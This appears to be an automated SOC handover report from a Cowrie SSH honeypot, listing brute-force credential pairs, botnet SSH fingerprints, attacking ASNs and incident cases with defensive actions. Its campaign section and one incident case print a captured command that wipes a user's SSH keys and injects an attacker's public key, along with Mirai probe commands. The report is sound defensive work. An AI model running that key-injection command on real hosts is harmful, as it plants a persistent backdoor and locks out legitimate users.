# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T14:11:41Z |
| **Shift Time** | 14:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **421** |
| Confirmed Threats | **414** |
| False Positives Filtered | **7** (1.7%) |
| Unique Attacker IPs | **69** |
| Countries of Origin | **18** |
| High Severity Cases | **194** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **227** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **223** |
| Unique Credential Pairs | **145** |
| Unique Usernames | **43** |
| Unique Passwords | **122** |
| Successful Auth Pairs | **194** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 99 |
| `345gs5662d34` | 26 |
| `ubuntu` | 15 |
| `user` | 9 |
| `GET / HTTP/1.1` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 26 |
| `3245gs5662d34` | 26 |
| `123456` | 8 |
| `smo@@kkklss` | 6 |
| `Host: 129.80.119.236:23` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 26 |
| `root` | `3245gs5662d34` | 15 |
| `root` | `smo@@kkklss` | 6 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 5 |
| `*1` | `$4` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `apache` | `apache` | `45.205.1.42` | 2026-07-02T08:55:46 |
| `root` | `Qwerty99` | `43.165.180.54` | 2026-07-02T08:58:00 |
| `345gs5662d34` | `345gs5662d34` | `43.165.180.54` | 2026-07-02T08:58:03 |
| `root` | `3245gs5662d34` | `43.165.180.54` | 2026-07-02T08:58:04 |
| `confluence` | `confluence` | `45.198.224.120` | 2026-07-02T08:58:19 |
| `proyectos` | `123456` | `10.0.0.73` | 2026-07-02T09:06:53 |
| `root` | `1` | `195.178.110.227` | 2026-07-02T09:07:03 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.79.0.187` | 2026-07-02T09:07:32 |
| `*1` | `$4` | `34.79.0.187` | 2026-07-02T09:07:46 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 294` | `34.79.0.187` | 2026-07-02T09:07:48 |
| `root` | `12` | `195.178.110.227` | 2026-07-02T09:08:58 |
| `ubuntu` | `asdasd` | `45.198.224.120` | 2026-07-02T09:09:11 |
| `root` | `zaq123wsx` | `45.205.1.42` | 2026-07-02T09:09:52 |
| `root` | `123` | `195.178.110.227` | 2026-07-02T09:11:05 |
| `edge` | `123456` | `81.192.46.32` | 2026-07-02T09:12:31 |
| `345gs5662d34` | `345gs5662d34` | `81.192.46.32` | 2026-07-02T09:12:33 |
| `edge` | `3245gs5662d34` | `81.192.46.32` | 2026-07-02T09:12:34 |
| `hybrid` | `hybrid123` | `10.0.0.73` | 2026-07-02T09:13:17 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T09:13:20 |
| `hybrid` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T09:13:22 |
| `root` | `1234` | `195.178.110.227` | 2026-07-02T09:13:44 |
| `root` | `12345` | `195.178.110.227` | 2026-07-02T09:17:45 |
| `root` | `administrator888` | `40.82.214.8` | 2026-07-02T09:18:47 |
| `345gs5662d34` | `345gs5662d34` | `40.82.214.8` | 2026-07-02T09:18:50 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-07-02T09:18:52 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-02T09:18:54 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-02T09:18:54 |
| `jhon` | `jhon` | `45.198.224.120` | 2026-07-02T09:19:56 |
| `elasticuser` | `123456` | `140.83.83.72` | 2026-07-02T09:23:03 |
| `345gs5662d34` | `345gs5662d34` | `140.83.83.72` | 2026-07-02T09:23:08 |
| `elasticuser` | `3245gs5662d34` | `140.83.83.72` | 2026-07-02T09:23:09 |
| `ubuntu` | `debian123456` | `45.205.1.42` | 2026-07-02T09:23:41 |
| `user` | `qazwsx123` | `144.48.6.26` | 2026-07-02T09:24:21 |
| `345gs5662d34` | `345gs5662d34` | `144.48.6.26` | 2026-07-02T09:24:26 |
| `user` | `3245gs5662d34` | `144.48.6.26` | 2026-07-02T09:24:28 |
| `root` | `huihui` | `103.82.21.8` | 2026-07-02T09:24:38 |
| `345gs5662d34` | `345gs5662d34` | `103.82.21.8` | 2026-07-02T09:24:43 |
| `root` | `3245gs5662d34` | `103.82.21.8` | 2026-07-02T09:24:45 |
| `root` | `ubuntu` | `61.240.17.66` | 2026-07-02T09:25:02 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-02T09:25:25 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-02T09:25:26 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-02T09:25:30 |
| `git` | `git!@#` | `185.242.3.195` | 2026-07-02T09:25:42 |
| `root` | `Ld123456.` | `165.227.93.100` | 2026-07-02T09:26:12 |
| `345gs5662d34` | `345gs5662d34` | `165.227.93.100` | 2026-07-02T09:26:14 |
| `root` | `3245gs5662d34` | `165.227.93.100` | 2026-07-02T09:26:14 |
| `server` | `server2025` | `104.236.99.179` | 2026-07-02T09:28:18 |
| `345gs5662d34` | `345gs5662d34` | `104.236.99.179` | 2026-07-02T09:28:20 |
| `server` | `3245gs5662d34` | `104.236.99.179` | 2026-07-02T09:28:20 |
| `root` | `thomas123` | `106.12.69.68` | 2026-07-02T09:29:05 |
| `345gs5662d34` | `345gs5662d34` | `106.12.69.68` | 2026-07-02T09:29:09 |
| `root` | `3245gs5662d34` | `106.12.69.68` | 2026-07-02T09:29:13 |
| `git` | `git!@#` | `10.0.0.73` | 2026-07-02T09:29:28 |
| `root` | `P@ssw0rd123!@#` | `45.198.224.120` | 2026-07-02T09:30:55 |
| `root` | `1234567` | `195.178.110.227` | 2026-07-02T09:33:49 |
| `root` | `princess` | `45.205.1.42` | 2026-07-02T09:37:33 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7553` | `34.79.0.187` | 2026-07-02T09:41:16 |
| `root` | `peanut` | `45.198.224.120` | 2026-07-02T09:41:54 |
| `root` | `12345678` | `195.178.110.227` | 2026-07-02T09:47:23 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-02T09:47:35 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-02T09:47:35 |
| `zhangguangyi` | `zhangguangyi` | `45.205.1.42` | 2026-07-02T09:51:38 |
| `root` | `qwerty123456789` | `45.198.224.120` | 2026-07-02T09:53:08 |
| `root` | `Passwd123` | `45.198.224.120` | 2026-07-02T10:04:10 |
| `root` | `123456789` | `195.178.110.227` | 2026-07-02T10:05:15 |
| `ubuntu` | `zxcvbnm` | `45.205.1.42` | 2026-07-02T10:05:39 |
| `root` | `plex123` | `10.0.0.73` | 2026-07-02T10:05:57 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T10:06:03 |
| `dev` | `devdev` | `10.0.0.73` | 2026-07-02T10:07:27 |
| `dev` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T10:07:33 |
| `root` | `Huawei@123456` | `10.0.0.73` | 2026-07-02T10:08:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.145.211` | 2026-07-02T10:11:52 |
| `*1` | `$4` | `34.77.145.211` | 2026-07-02T10:12:00 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6211` | `34.77.145.211` | 2026-07-02T10:12:02 |
| `ubuntu` | `passworded` | `45.198.224.120` | 2026-07-02T10:15:12 |
| `root` | `1234567890` | `195.178.110.227` | 2026-07-02T10:18:24 |
| `root` | `a1234567` | `45.205.1.42` | 2026-07-02T10:20:30 |
| `user` | `qwerty` | `185.242.3.195` | 2026-07-02T10:21:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.104.11.51` | 2026-07-02T10:22:44 |
| `root` | `asdfgasdfg` | `45.198.224.120` | 2026-07-02T10:26:17 |
| `root` | `123qwe` | `195.178.110.227` | 2026-07-02T10:31:40 |
| `root` | `admin-123456` | `45.205.1.42` | 2026-07-02T10:34:15 |
| `ubuntu` | `123456a` | `45.198.224.120` | 2026-07-02T10:37:33 |
| `root` | `123qwerty` | `195.178.110.227` | 2026-07-02T10:41:52 |
| `root` | `zhang456` | `203.88.119.100` | 2026-07-02T10:45:35 |
| `345gs5662d34` | `345gs5662d34` | `203.88.119.100` | 2026-07-02T10:45:37 |
| `root` | `3245gs5662d34` | `203.88.119.100` | 2026-07-02T10:45:37 |
| `root` | `qwertz1` | `45.205.1.42` | 2026-07-02T10:48:25 |
| `root` | `qwer@123` | `45.198.224.120` | 2026-07-02T10:48:35 |
| `root` | `` | `141.11.88.117` | 2026-07-02T10:51:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.14.84.236` | 2026-07-02T10:51:58 |
| `*1` | `$4` | `34.14.84.236` | 2026-07-02T10:52:11 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7997` | `34.14.84.236` | 2026-07-02T10:52:13 |
| `root` | `﻿------fuck------` | `120.202.189.21` | 2026-07-02T10:52:32 |
| `root` | `` | `141.11.88.103` | 2026-07-02T10:54:24 |
| `root` | `21` | `195.178.110.227` | 2026-07-02T10:54:42 |
| `root` | `R%access321@` | `45.198.224.120` | 2026-07-02T10:59:39 |
| `user` | `qwerty` | `10.0.0.73` | 2026-07-02T11:01:01 |
| `root` | `1q2w3e@1234` | `189.146.63.139` | 2026-07-02T11:01:32 |
| `345gs5662d34` | `345gs5662d34` | `189.146.63.139` | 2026-07-02T11:01:34 |
| `root` | `3245gs5662d34` | `189.146.63.139` | 2026-07-02T11:01:35 |
| `root` | `friends` | `45.205.1.42` | 2026-07-02T11:02:22 |
| `root` | `p@ssw0rd11` | `103.88.76.27` | 2026-07-02T11:06:59 |
| `345gs5662d34` | `345gs5662d34` | `103.88.76.27` | 2026-07-02T11:07:03 |
| `root` | `3245gs5662d34` | `103.88.76.27` | 2026-07-02T11:07:05 |
| `root` | `321` | `195.178.110.227` | 2026-07-02T11:07:40 |
| `dep` | `dep` | `51.75.64.35` | 2026-07-02T11:08:17 |
| `345gs5662d34` | `345gs5662d34` | `51.75.64.35` | 2026-07-02T11:08:19 |
| `dep` | `3245gs5662d34` | `51.75.64.35` | 2026-07-02T11:08:20 |
| `root` | `PASSWORD123` | `45.198.224.120` | 2026-07-02T11:10:37 |
| `encore` | `encore123` | `10.0.0.73` | 2026-07-02T11:14:12 |
| `encore` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T11:14:16 |
| `root` | `﻿------fuck------` | `14.22.81.14` | 2026-07-02T11:15:44 |
| `ubuntu` | `hduser12` | `45.205.1.42` | 2026-07-02T11:16:22 |
| `root` | `4321` | `195.178.110.227` | 2026-07-02T11:16:30 |
| `root` | `FW18rk17lZ` | `45.198.224.120` | 2026-07-02T11:21:46 |
| `root` | `54321` | `195.178.110.227` | 2026-07-02T11:28:17 |
| `root` | `qwert!@#45` | `45.205.1.42` | 2026-07-02T11:30:17 |
| `root` | `qwertz123` | `45.198.224.120` | 2026-07-02T11:32:48 |
| `admin` | `admin` | `43.172.74.146` | 2026-07-02T11:36:51 |
| `user` | `u` | `10.0.0.73` | 2026-07-02T11:36:59 |
| `user` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T11:37:06 |
| `root` | `654321` | `195.178.110.227` | 2026-07-02T11:40:17 |
| `user` | `qwerty123` | `10.0.0.73` | 2026-07-02T11:42:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.179.1` | 2026-07-02T11:42:13 |
| `*1` | `$4` | `34.77.179.1` | 2026-07-02T11:42:27 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7509` | `34.77.179.1` | 2026-07-02T11:42:29 |
| `ubuntu` | `1234` | `45.198.224.120` | 2026-07-02T11:43:37 |
| `www2` | `www2` | `45.205.1.42` | 2026-07-02T11:44:16 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-02T11:48:36 |
| `ubuntu` | `qwas12` | `185.242.3.195` | 2026-07-02T11:52:21 |
| `root` | `112233` | `45.198.224.120` | 2026-07-02T11:54:28 |
| `root` | `123789` | `78.44.192.210` | 2026-07-02T11:57:42 |
| `345gs5662d34` | `345gs5662d34` | `78.44.192.210` | 2026-07-02T11:57:44 |
| `root` | `3245gs5662d34` | `78.44.192.210` | 2026-07-02T11:57:45 |
| `install` | `install` | `45.205.1.42` | 2026-07-02T11:58:02 |
| `adminftp` | `123456` | `143.95.209.223` | 2026-07-02T12:04:32 |
| `345gs5662d34` | `345gs5662d34` | `143.95.209.223` | 2026-07-02T12:04:35 |
| `adminftp` | `3245gs5662d34` | `143.95.209.223` | 2026-07-02T12:04:36 |
| `sol` | `sol` | `2.57.122.238` | 2026-07-02T12:05:11 |
| `root` | `love123` | `45.198.224.120` | 2026-07-02T12:05:29 |
| `solana` | `solana` | `2.57.122.238` | 2026-07-02T12:06:56 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-07-02T12:08:38 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-07-02T12:10:13 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-07-02T12:11:49 |
| `root` | `asddsa` | `45.205.1.42` | 2026-07-02T12:11:57 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-07-02T12:13:27 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-07-02T12:15:01 |
| `root` | `111111` | `195.178.110.227` | 2026-07-02T12:15:33 |
| `node` | `node` | `2.57.122.238` | 2026-07-02T12:16:31 |
| `root` | `QWEzaq123!@#` | `45.198.224.120` | 2026-07-02T12:16:32 |
| `node` | `1234` | `2.57.122.238` | 2026-07-02T12:18:07 |
| `root` | `123123` | `195.178.110.227` | 2026-07-02T12:18:59 |
| `node` | `123456` | `2.57.122.238` | 2026-07-02T12:19:49 |
| `root` | `123321` | `195.178.110.227` | 2026-07-02T12:21:23 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-07-02T12:21:29 |
| `eth` | `eth` | `2.57.122.238` | 2026-07-02T12:23:06 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-07-02T12:24:44 |
| `root` | `qwert@123` | `45.205.1.42` | 2026-07-02T12:25:55 |
| `tron` | `tron` | `2.57.122.238` | 2026-07-02T12:26:24 |
| `ubuntu` | `123qweASD` | `45.198.224.120` | 2026-07-02T12:27:34 |
| `trx` | `trx` | `2.57.122.238` | 2026-07-02T12:28:00 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-07-02T12:29:33 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-02T12:29:34 |
| `root` | `password$1` | `45.117.179.232` | 2026-07-02T12:30:44 |
| `345gs5662d34` | `345gs5662d34` | `45.117.179.232` | 2026-07-02T12:30:48 |
| `root` | `3245gs5662d34` | `45.117.179.232` | 2026-07-02T12:30:50 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-07-02T12:31:08 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-07-02T12:32:46 |
| `ubuntu` | `qwas12` | `10.0.0.73` | 2026-07-02T12:32:47 |
| `root` | `Abcd12#$` | `103.187.146.72` | 2026-07-02T12:33:30 |
| `root` | `Hz123456` | `60.199.224.2` | 2026-07-02T12:33:31 |
| `345gs5662d34` | `345gs5662d34` | `103.187.146.72` | 2026-07-02T12:33:35 |
| `345gs5662d34` | `345gs5662d34` | `60.199.224.2` | 2026-07-02T12:33:35 |
| `root` | `3245gs5662d34` | `60.199.224.2` | 2026-07-02T12:33:37 |
| `root` | `3245gs5662d34` | `103.187.146.72` | 2026-07-02T12:33:37 |
| `solv` | `solv` | `2.57.122.238` | 2026-07-02T12:34:25 |
| `solv` | `1234` | `2.57.122.238` | 2026-07-02T12:36:02 |
| `solv` | `123456` | `2.57.122.238` | 2026-07-02T12:37:45 |
| `root` | `1q2w3e4r` | `45.198.224.120` | 2026-07-02T12:38:13 |
| `solv` | `12345678` | `2.57.122.238` | 2026-07-02T12:39:27 |
| `ubuntu` | `123root321` | `45.205.1.42` | 2026-07-02T12:39:54 |
| `root` | `Ln@123456` | `1.94.208.147` | 2026-07-02T12:43:41 |
| `345gs5662d34` | `345gs5662d34` | `1.94.208.147` | 2026-07-02T12:43:45 |
| `root` | `3245gs5662d34` | `1.94.208.147` | 2026-07-02T12:43:47 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-07-02T12:44:15 |
| `validator` | `validator` | `2.57.122.238` | 2026-07-02T12:45:53 |
| `sol` | `sol123` | `2.57.122.238` | 2026-07-02T12:47:28 |
| `sol` | `123` | `2.57.122.238` | 2026-07-02T12:49:07 |
| `ubuntu` | `qwerty1234` | `45.198.224.120` | 2026-07-02T12:49:37 |
| `sol` | `12345678` | `2.57.122.238` | 2026-07-02T12:50:51 |
| `trading` | `trading` | `2.57.122.238` | 2026-07-02T12:52:36 |
| `trader` | `trader` | `2.57.122.238` | 2026-07-02T12:54:11 |
| `ubuntu` | `Password@1` | `45.205.1.42` | 2026-07-02T12:54:15 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **421** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 106 |
| libssh | 62 |
| Paramiko (Python) | 16 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 76 | 4 |
| `f555226df196...` | Mirai/variant | 52 | 18 |
| `2ec37a7cc8da...` | Mirai/variant | 25 | 1 |
| `a2de0f306611...` | Mirai/variant | 16 | 3 |
| `03a80b21afa8...` | Modern SSH client | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 76 | 4 | Generic scanner |
| `f555226df196...` | libssh | 52 | 18 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 25 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 16 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 19 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `141.11.88.103`, `141.11.88.117`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `104.236.99.179`, `143.95.209.223`, `203.88.119.100`, `165.227.93.100`, `60.199.224.2`, `106.12.69.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **69** |
| Unique ASNs | **37** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (191)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7ff11ef6685f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 08:55 |
| **Last Seen** | 2026-07-02 08:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:55:44` | `cowrie.session.connect` |
| `2026-07-02 08:55:44` | `cowrie.client.version` |
| `2026-07-02 08:55:44` | `cowrie.client.kex` |
| `2026-07-02 08:55:46` | `cowrie.login.success` |
| `2026-07-02 08:55:48` | `cowrie.session.params` |
| `2026-07-02 08:55:48` | `cowrie.command.input` |
| `2026-07-02 08:55:48` | `cowrie.log.closed` |
| `2026-07-02 08:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91e12ac33622

| Field | Detail |
|---|---|
| **Source IP** | `43.165.180[.]54` |
| **First Seen** | 2026-07-02 08:57 |
| **Last Seen** | 2026-07-02 08:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:57:59` | `cowrie.session.connect` |
| `2026-07-02 08:57:59` | `cowrie.client.version` |
| `2026-07-02 08:57:59` | `cowrie.client.kex` |
| `2026-07-02 08:58:00` | `cowrie.login.success` |
| `2026-07-02 08:58:01` | `cowrie.session.params` |
| `2026-07-02 08:58:01` | `cowrie.command.input` |
| `2026-07-02 08:58:01` | `cowrie.command.failed` |
| `2026-07-02 08:58:01` | `cowrie.log.closed` |
| `2026-07-02 08:58:02` | `cowrie.session.params` |
| `2026-07-02 08:58:02` | `cowrie.command.input` |
| `2026-07-02 08:58:02` | `cowrie.session.file_download` |
| `2026-07-02 08:58:02` | `cowrie.log.closed` |
| `2026-07-02 08:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.180[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.165.180[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0b3e4f25255

| Field | Detail |
|---|---|
| **Source IP** | `43.165.180[.]54` |
| **First Seen** | 2026-07-02 08:58 |
| **Last Seen** | 2026-07-02 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:58:02` | `cowrie.session.connect` |
| `2026-07-02 08:58:02` | `cowrie.client.version` |
| `2026-07-02 08:58:02` | `cowrie.client.kex` |
| `2026-07-02 08:58:03` | `cowrie.login.success` |
| `2026-07-02 08:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.180[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.165.180[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec53093cc1cb

| Field | Detail |
|---|---|
| **Source IP** | `43.165.180[.]54` |
| **First Seen** | 2026-07-02 08:58 |
| **Last Seen** | 2026-07-02 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:58:03` | `cowrie.session.connect` |
| `2026-07-02 08:58:03` | `cowrie.client.version` |
| `2026-07-02 08:58:03` | `cowrie.client.kex` |
| `2026-07-02 08:58:04` | `cowrie.login.success` |
| `2026-07-02 08:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.180[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.165.180[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc3bd523eec

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 08:58 |
| **Last Seen** | 2026-07-02 08:58 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:58:11` | `cowrie.session.connect` |
| `2026-07-02 08:58:13` | `cowrie.client.version` |
| `2026-07-02 08:58:13` | `cowrie.client.kex` |
| `2026-07-02 08:58:19` | `cowrie.login.success` |
| `2026-07-02 08:58:22` | `cowrie.session.params` |
| `2026-07-02 08:58:22` | `cowrie.command.input` |
| `2026-07-02 08:58:23` | `cowrie.log.closed` |
| `2026-07-02 08:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee847abba3b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:07 |
| **Last Seen** | 2026-07-02 09:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:07:00` | `cowrie.session.connect` |
| `2026-07-02 09:07:00` | `cowrie.client.version` |
| `2026-07-02 09:07:00` | `cowrie.client.kex` |
| `2026-07-02 09:07:03` | `cowrie.login.success` |
| `2026-07-02 09:07:06` | `cowrie.session.params` |
| `2026-07-02 09:07:06` | `cowrie.command.input` |
| `2026-07-02 09:07:07` | `cowrie.log.closed` |
| `2026-07-02 09:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

